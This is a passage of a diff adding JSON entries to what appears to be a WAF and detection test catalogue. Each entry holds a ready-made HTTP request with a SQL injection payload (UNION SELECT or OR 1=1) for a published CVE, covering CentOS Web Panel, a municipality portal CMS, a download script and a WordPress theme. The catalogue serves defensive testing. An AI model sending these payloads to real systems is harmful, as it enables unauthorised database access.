+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15620",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-767/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15619 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "displayName": "CVE-2020-15619 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the type parameter of ajax_list_accounts.php, used unsanitized to build a SQL query (executes in the context of root per ZDI-20-766). The request sends a UNION SELECT payload in the type parameter (OWASP CRS 942). HTTP method inferred as GET (account-listing filter); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-766/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15619 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_list_accounts.php?type=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15619"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15619",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-766/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15618 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "displayName": "CVE-2020-15618 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the username parameter of ajax_list_accounts.php, used unsanitized to build a SQL query (executes in the context of root per ZDI-20-765). The request sends a UNION SELECT payload in the username parameter (OWASP CRS 942). HTTP method inferred as GET (account-listing filter); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-765/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15618 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_list_accounts.php?username=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15618"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15618",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-765/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15617 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "displayName": "CVE-2020-15617 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the status parameter of ajax_list_accounts.php, used unsanitized to build a SQL query (executes in the context of root per ZDI-20-764). The request sends a UNION SELECT payload in the status parameter (OWASP CRS 942). HTTP method inferred as GET (account-listing filter); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-764/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15617 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_list_accounts.php?status=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15617"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15617",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-764/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15616 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "displayName": "CVE-2020-15616 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the package parameter of ajax_list_accounts.php, used unsanitized to build a SQL query (executes in the context of root per ZDI-20-763). The request sends a UNION SELECT payload in the package parameter (OWASP CRS 942). HTTP method inferred as GET (account-listing filter); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-763/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15616 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_list_accounts.php?package=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15616"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15616",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-763/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15539 - We-com Municipality portal CMS SQL Injection",
+    "displayName": "CVE-2020-15539 - We-com Municipality portal CMS SQL Injection",
+    "description": "We-com Municipality portal CMS 2.1.x is vulnerable to SQL injection via the keywords field of the /cerca/ search endpoint. The request sends a UNION SELECT payload in the keywords parameter (OWASP CRS 942). HTTP method inferred as GET (search endpoint). No vendor WAF rule found; built from the CVE description and PacketStorm advisory.\n\nReferences used to recreate this request:\n- https://packetstormsecurity.com/files/157886/We-Com-Municipality-Portal-CMS-2.1.x-Cross-Site-Scripting-SQL-Injection.html (advisory / entry point)\n- https://cxsecurity.com/issue/WLB-2020060011 (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2020-15539 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cerca/?keywords=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15539"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_packetstorm for CVE-2020-15539",
+        "link": "https://packetstormsecurity.com/files/157886/We-Com-Municipality-Portal-CMS-2.1.x-Cross-Site-Scripting-SQL-Injection.html"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15468 - Persian VIP Download Script SQL Injection",
+    "displayName": "CVE-2020-15468 - Persian VIP Download Script SQL Injection",
+    "description": "Persian VIP Download Script 1.0 is vulnerable to SQL injection via the active parameter of cart_edit.php. The request sends an OR 1=1 boolean SQL injection payload in the active parameter (OWASP CRS 942). HTTP method inferred as GET. No vendor WAF rule found; built from the Exploit-DB PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/48190 (Exploit-DB PoC / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15468 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cart_edit.php?active=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15468"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2020-15468",
+        "link": "https://www.exploit-db.com/exploits/48190"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15363 - WordPress Nexos Theme SQL Injection",
+    "displayName": "CVE-2020-15363 - WordPress Nexos Theme SQL Injection",
+    "description": "The Nexos (Real Estate) theme through 1.7 for WordPress is vulnerable to SQL injection via the search_order parameter of the /side-map/ endpoint. The request sends a UNION SELECT payload in search_order (OWASP CRS 942). HTTP method is GET (path and parameter taken from the PoC). No vendor WAF rule found; built from the GitHub PoC.\n\nReferences used to recreate this request:\n- https://github.com/vladvector/vladvector.github.io/blob/master/exploit/2020-06-17-nexos-real-estate-wordpress-theme-v1-7.txt (PoC / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15363 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /side-map/?search_order=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15363"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-15363",
+        "link": "https://github.com/vladvector/vladvector.github.io/blob/master/exploit/2020-06-17-nexos-real-estate-wordpress-theme-v1-7.txt"
       }
     ],
     "public": false,
